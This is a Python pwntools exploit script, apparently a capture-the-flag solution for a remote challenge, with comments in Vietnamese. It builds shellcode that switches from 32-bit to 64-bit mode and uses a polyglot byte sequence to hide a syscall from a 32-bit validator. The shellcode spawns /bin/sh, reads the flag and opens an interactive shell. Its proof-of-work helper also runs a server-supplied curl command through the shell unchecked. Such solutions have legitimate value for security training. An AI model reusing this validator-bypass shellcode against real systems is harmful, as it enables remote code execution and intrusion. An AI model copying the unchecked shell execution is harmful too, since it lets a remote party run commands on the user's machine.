from pwn import *
import subprocess

context.arch = 'i386'
context.log_level = 'info'

HOST = 'amt.rs'
PORT = 57207

def solve_pow(r):
    print("[-] Checking PoW...")
    try:
        data = r.recv(4096, timeout=5)
        if b'proof of work' in data:
            lines = data.split(b'\n')
            for line in lines:
                if b'curl' in line:
                    cmd = f"curl {line.split(b'curl')[1].decode().strip()}"
                    print(f"[*] Run PoW: {cmd}")
                    sol = subprocess.check_output(cmd, shell=True).strip()
                    r.sendline(sol)
                    break
    except: pass

def get_payload():
    # Base address
    base = 0x1337000
    header_size = 5
    
    # === 1. SETUP 32-BIT ===
    # Chúng ta set EAX = 59 (Execve) NGAY TỪ ĐẦU.
    # Không cần lo lắng về 'dec eax' vì ở 64-bit mode, byte 48 không trừ register.
    setup = asm('''
        /* Push /bin///sh */
        sub eax, eax
        push eax
        push 0x68732f2f
        push 0x6e69622f
        mov ebx, esp
        
        sub ecx, ecx
        sub edx, edx
        
        /* eax = 59 (execve 64-bit) */
        push 59
        pop eax
    ''')
    
    # === 2. LJMP TO 64-BIT ===
    # Tính offset để nhảy đến phần code Adapter
    offset_ljmp = 7
    target_addr = base + header_size + len(setup) + offset_ljmp
    
    # ljmp CS:EIP -> CS = 0x33 (64-bit Selector), EIP = target_addr
    ljmp = b'\xea' + p32(target_addr) + b'\x33\x00'
    
    # === 3. 64-BIT ADAPTER ===
    # Code chạy ở 64-bit mode.
    # Chuyển ebx -> rdi (filename)
    # Chuyển ecx -> rsi (argv)
    # rdx (envp) đã là 0 từ setup.
    
    # Byte code: 48 89 DF (mov rdi, rbx)
    # Validator 32-bit nhìn: dec eax; mov edi, ebx (Hợp lệ)
    adapter = b'\x48\x89\xdf'
    
    # Byte code: 48 89 CA (mov rsi, rcx)
    # Validator 32-bit nhìn: dec eax; mov edx, ecx (Hợp lệ)
    adapter += b'\x48\x89\xca'
    
    # === 4. POLYGLOT SYSCALL ===
    # Chiến thuật "Illusion":
    # 64-bit: mov rbx, [8 bytes rác] ... byte tiếp theo là syscall
    # 32-bit: dec eax; mov ebx, ...; cmp eax, ...; add eax, ...
    
    polyglot = b''
    polyglot += b'\x48'             # Prefix REX.W (32-bit: dec eax) -> Vô hại
    polyglot += b'\xBB'             # mov rbx, imm64 (32-bit: mov ebx, imm32)
    
    # Immediate 8 bytes của mov rbx:
    # 4 byte đầu: 90 90 90 90
    # 4 byte sau: 3D 90 90 90
    # Tổng immediate: 90 90 90 90 3D 90 90 90
    polyglot += b'\x90'*4           
    
    # Byte thứ 6 trong chuỗi (phần giữa immediate của mov rbx)
    # 32-bit: Opcode 'cmp eax' (0x3D). Nó "ăn" 4 byte tiếp theo làm immediate.
    polyglot += b'\x3D'             
    
    # Immediate của cmp eax (32-bit): 90 90 90 0F
    polyglot += b'\x90'*3
    polyglot += b'\x0F'             # Byte 10: Byte cuối của immediate CMP (32-bit)
                                    # ĐỒNG THỜI là byte đầu của SYSCALL (64-bit)
    
    # Byte 11: Opcode lệnh tiếp theo của 32-bit, Operand syscall của 64-bit
    polyglot += b'\x05'             # 32-bit: add eax, ... | 64-bit: 0F 05 (SYSCALL)
    
    polyglot += b'\x90'*4           # Operand cho lệnh add eax (32-bit) -> Rác
    
    return setup + ljmp + adapter + polyglot

r = remote(HOST, PORT)
solve_pow(r)

payload = get_payload()
print(f"[*] Payload Length: {len(payload)}")
r.sendlineafter(b'shellcode: ', payload.hex().encode())

print("[+] Shellcode sent! Waiting for shell...")
# Tự động gõ ls và cat flag
r.sendline(b'ls; cat flag')
r.interactive()